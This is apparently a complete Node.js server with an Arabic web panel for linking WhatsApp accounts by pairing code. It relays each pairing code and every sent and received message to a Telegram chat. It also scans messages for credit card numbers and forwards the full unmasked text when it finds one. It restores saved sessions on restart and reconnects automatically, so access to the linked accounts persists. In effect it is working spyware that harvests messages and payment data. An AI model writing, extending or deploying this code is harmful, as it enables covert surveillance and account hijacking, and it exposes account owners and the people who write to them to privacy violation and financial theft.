import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ========== TELEGRAM ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
let telegramBot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('✅ بوت تليجرام جاهز');
} else console.warn('⚠️ تليجرام غير مهيأ');

async function sendToTelegram(msg) {
    if (!telegramBot) return;
    try {
        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' });
    } catch (err) { console.error('❌ تليجرام:', err.message); }
}

function scanSensitive(text) {
    const patterns = [{
        name: '💳 بطاقة ائتمان',
        regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12})\b/g,
        mask: (m) => m.slice(0,4)+'-****-****-'+m.slice(-4)
    }];
    let detected = [];
    for (let p of patterns) {
        let match;
        while ((match = p.regex.exec(text)) !== null)
            detected.push({ type: p.name, masked: p.mask(match[0]) });
    }
    return detected;
}

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

const activeSessions = new Map();
const sessionsData = new Map();

function broadcastAccounts() {
    io.emit('accounts_list', Array.from(sessionsData.values()));
}

function updateSession(phone, status, device = null) {
    let old = activeSessions.get(phone) || {};
    old.status = status;
    if (device) old.device = device;
    activeSessions.set(phone, old);
    sessionsData.set(phone, {
        phone,
        status,
        device: old.device || 'غير معروف',
        date: sessionsData.get(phone)?.date || new Date().toLocaleString()
    });
    broadcastAccounts();
}

async function createWhatsAppSession(phoneNumber, isRestore = false) {
    console.log(`[${phoneNumber}] جاري إنشاء...`);
    updateSession(phoneNumber, 'جاري الاتصال...');
    const sessionDir = path.join(__dirname, `auth_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
    });

    sock.ev.on('creds.update', saveCreds);
    let pairingRequested = false;

    sock.ev.on('connection.update', async (update) => {
        const conn = update.connection;
        console.log(`[${phoneNumber}] حالة: ${conn}`);
        if (conn === 'open') {
            let device = sock.user?.device || 'ماك ديسكتوب';
            updateSession(phoneNumber, 'متصل', device);
            if (!state.creds.registered && !pairingRequested && !isRestore) {
                pairingRequested = true;
                setTimeout(async () => {
                    try {
                        const code = await sock.requestPairingCode(phoneNumber);
                        io.emit('pairing_code', { code, phoneNumber });
                        await sendToTelegram(`🔐 رمز اقتران ${phoneNumber}: \`${code}\``);
                    } catch (err) {
                        console.error(`فشل الرمز: ${err.message}`);
                        io.emit('error', `فشل طلب الرمز لـ ${phoneNumber}`);
                        pairingRequested = false;
                        updateSession(phoneNumber, 'خطأ بالربط');
                    }
                }, 5000);
            }
        } else if (conn === 'close') {
            updateSession(phoneNumber, 'غير متصل');
            setTimeout(() => createWhatsAppSession(phoneNumber, false), 60000);
        } else if (conn === 'connecting') {
            updateSession(phoneNumber, 'جاري الاتصال...');
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            if (msg.message && !msg.key.fromMe) {
                let text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                if (!text) continue;
                const sender = msg.pushName || msg.key.remoteJid;
                const time = new Date().toLocaleString('ar-EG');
                await sendToTelegram(`📩 *من:* ${sender}\n📱 *على حساب:* ${phoneNumber}\n⏰ ${time}\n💬 ${text.substring(0,500)}`);
                const sensitive = scanSensitive(text);
                if (sensitive.length)
                    await sendToTelegram(`🚨 *بيانات حساسة* 🚨\n${sensitive.map(s=>s.masked).join('\n')}\n${text}`);
            }
        }
    });

    return sock;
}

async function restoreSessions() {
    const dir = path.join(__dirname, 'auth_sessions');
    if (!fs.existsSync(dir)) return;
    const phones = fs.readdirSync(dir).filter(f => f !== '.DS_Store');
    for (const phone of phones) {
        try {
            const sock = await createWhatsAppSession(phone, true);
            activeSessions.set(phone, { sock, status: 'متصل', device: 'مستعاد' });
            updateSession(phone, 'متصل', 'مستعاد');
            await sendToTelegram(`✅ استعادة حساب ${phone}`);
        } catch (err) { console.error(`فشل استعادة ${phone}:`, err); }
    }
}

async function sendMessage(fromPhone, toNumber, text) {
    const session = activeSessions.get(fromPhone);
    if (!session || session.status !== 'متصل') throw new Error('الحساب المرسل غير متصل');
    let jid = toNumber.replace(/\D/g, '') + '@s.whatsapp.net';
    await session.sock.sendMessage(jid, { text });
    await sendToTelegram(`📨 *رسالة مرسلة* من ${fromPhone} إلى ${toNumber}\n✏️ ${text}`);
}

// ========== HTML PAGE (بدون تداخل backticks) ==========
const HTML_PAGE = `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مراقب واتساب + إرسال رسائل</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background:#075E54; font-family: 'Segoe UI'; padding:20px; margin:0; }
        .container { max-width:900px; margin:auto; background:white; border-radius:20px; padding:30px; }
        h1,h2 { color:#075E54; text-align:center; }
        input,select,textarea,button { width:100%; padding:12px; margin:8px 0; border-radius:8px; border:1px solid #ddd; box-sizing:border-box; font-size:16px; }
        button { background:#25D366; color:white; font-weight:bold; border:none; cursor:pointer; }
        .status { padding:10px; border-radius:8px; margin:10px 0; display:none; }
        .success { background:#d4edda; color:#155724; display:block; }
        .error { background:#f8d7da; color:#721c24; display:block; }
        .info { background:#e2f0fb; color:#0c5460; display:block; }
        .accounts-list { max-height:300px; overflow-y:auto; margin:20px 0; }
        .account-item { background:#f8f9fa; padding:12px; margin:8px 0; border-radius:8px; border-right:4px solid #25D366; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
        .status-connected { color:green; font-weight:bold; }
        .status-disconnected { color:red; }
        .code-box { font-size:28px; letter-spacing:5px; background:#f5f5f5; padding:15px; text-align:center; border-radius:8px; font-family:monospace; }
        .hidden { display:none; }
        hr { margin:20px 0; }
        .small-text { font-size:12px; color:#666; text-align:center; margin-top:20px; }
    </style>
</head>
<body>
<div class="container">
    <h1>📱 مراقب واتساب + إرسال رسائل</h1>
    <p>➕ إضافة حساب جديد | 🟢 عرض الحالة | ✉️ إرسال رسائل لأي رقم</p>
    <input type="tel" id="phone" placeholder="رقم الجوال (مثل 967776730674)">
    <button id="addBtn">➕ إضافة حساب</button>
    <div id="statusMsg" class="status"></div>
    <div id="codeSection" class="hidden"><div class="code-box" id="codeDisplay"></div><p>✨ أدخل هذا الرمز في واتساب (الأجهزة المرتبطة)</p></div>

    <hr>
    <h2>📋 الحسابات المرتبطة</h2>
    <div id="accountsList" class="accounts-list">لا توجد حسابات بعد.</div>

    <hr>
    <h2>✉️ إرسال رسالة واتساب</h2>
    <select id="senderSelect"><option value="">-- اختر الحساب المرسل (يجب أن يكون متصلاً) --</option></select>
    <input type="tel" id="recipient" placeholder="رقم المستلم (مثال: 966512345678)">
    <textarea id="msgText" rows="3" placeholder="نص الرسالة"></textarea>
    <button id="sendBtn">📨 إرسال</button>
    <div id="sendStatus" class="status"></div>
    <div class="small-text">⚠️ جميع الرسائل التي تصل إلى حساباتك سترسل إلى تليجرام، وكذلك الرسائل التي ترسلها.</div>
</div>

<script>
(function() {
    const socket = io();
    const addBtn = document.getElementById('addBtn');
    const phoneInput = document.getElementById('phone');
    const statusDiv = document.getElementById('statusMsg');
    const codeSection = document.getElementById('codeSection');
    const codeDisplay = document.getElementById('codeDisplay');
    const accountsDiv = document.getElementById('accountsList');
    const senderSelect = document.getElementById('senderSelect');
    const recipient = document.getElementById('recipient');
    const msgText = document.getElementById('msgText');
    const sendBtn = document.getElementById('sendBtn');
    const sendStatusDiv = document.getElementById('sendStatus');

    function showStatus(msg, type, target) {
        target = target || statusDiv;
        target.textContent = msg;
        target.className = 'status ' + type;
        setTimeout(function() {
            if (target === statusDiv) target.className = 'status';
        }, 5000);
    }

    addBtn.onclick = function() {
        let phone = phoneInput.value.trim().replace(/\\D/g, '');
        if (!phone || phone.length < 8) return showStatus('رقم غير صحيح', 'error');
        addBtn.disabled = true;
        addBtn.innerHTML = '⏳ جاري الربط...';
        showStatus('جاري تجهيز الجلسة...', 'info');
        socket.emit('add_account', { phone: phone });
    };

    socket.on('pairing_code', function(data) {
        if (data.phoneNumber === phoneInput.value.trim().replace(/\\D/g, '')) {
            codeDisplay.innerHTML = data.code;
            codeSection.classList.remove('hidden');
            showStatus('✅ الرمز جاهز - أدخله في واتساب', 'success');
        }
    });

    socket.on('accounts_list', function(accounts) {
        if (!accounts.length) {
            accountsDiv.innerHTML = 'لا توجد حسابات';
            senderSelect.innerHTML = '<option value="">-- اختر حسابا --</option>';
            return;
        }
        var html = '';
        var options = '<option value="">-- اختر الحساب المرسل --</option>';
        for (var i = 0; i < accounts.length; i++) {
            var acc = accounts[i];
            var statusClass = '';
            if (acc.status === 'متصل') statusClass = 'status-connected';
            else if (acc.status === 'غير متصل') statusClass = 'status-disconnected';
            html += '<div class="account-item"><div><strong>' + acc.phone + '</strong><br>' + acc.device + '<br>' + acc.date + '</div><div class="' + statusClass + '">' + acc.status + '</div></div>';
            if (acc.status === 'متصل') {
                options += '<option value="' + acc.phone + '">📱 ' + acc.phone + ' (متصل)</option>';
            } else {
                options += '<option value="' + acc.phone + '" disabled>📱 ' + acc.phone + ' (' + acc.status + ')</option>';
            }
        }
        accountsDiv.innerHTML = html;
        senderSelect.innerHTML = options;
    });

    socket.on('error', function(msg) {
        addBtn.disabled = false;
        addBtn.innerHTML = '➕ إضافة حساب';
        showStatus(msg, 'error');
    });
    socket.on('connect', function() {
        showStatus('✅ متصل بالخادم', 'success');
        socket.emit('request_accounts');
    });
    socket.on('disconnect', function() {
        showStatus('❌ قطع الاتصال', 'error');
    });

    sendBtn.onclick = function() {
        var from = senderSelect.value;
        var to = recipient.value.trim().replace(/\\D/g, '');
        var text = msgText.value.trim();
        if (!from) return showStatus('اختر حسابا مرسلا', 'error', sendStatusDiv);
        if (!to || to.length < 8) return showStatus('رقم المستلم غير صحيح', 'error', sendStatusDiv);
        if (!text) return showStatus('أدخل نص الرسالة', 'error', sendStatusDiv);
        sendBtn.disabled = true;
        sendBtn.innerHTML = 'جاري الإرسال...';
        socket.emit('send_message', { from: from, to: to, text: text });
    };
    socket.on('message_sent', function(data) {
        sendBtn.disabled = false;
        sendBtn.innerHTML = '📨 إرسال';
        if (data.success) {
            showStatus('✅ تم الإرسال بنجاح', 'success', sendStatusDiv);
            recipient.value = '';
            msgText.value = '';
        } else {
            showStatus('❌ فشل: ' + data.error, 'error', sendStatusDiv);
        }
    });
})();
</script>
</body>
</html>`;

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/health', (req, res) => res.status(200).send('OK'));

io.on('connection', (socket) => {
    console.log('🟢 عميل متصل');
    socket.on('request_accounts', () => socket.emit('accounts_list', Array.from(sessionsData.values())));
    socket.on('add_account', async ({ phone }) => {
        let clean = phone.replace(/\D/g, '');
        if (activeSessions.has(clean)) return socket.emit('error', 'الحساب موجود');
        try {
            let sock = await createWhatsAppSession(clean, false);
            activeSessions.set(clean, { sock, status: 'متصل' });
            updateSession(clean, 'متصل', 'جديد');
            await sendToTelegram(`✅ تم ربط حساب ${clean}`);
        } catch(e) { socket.emit('error', e.message); }
    });
    socket.on('send_message', async ({ from, to, text }) => {
        try {
            await sendMessage(from, to, text);
            socket.emit('message_sent', { success: true });
        } catch(err) { socket.emit('message_sent', { success: false, error: err.message }); }
    });
});

process.on('uncaughtException', console.error);
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 يعمل على http://localhost:${PORT}`);
    await restoreSessions();
});
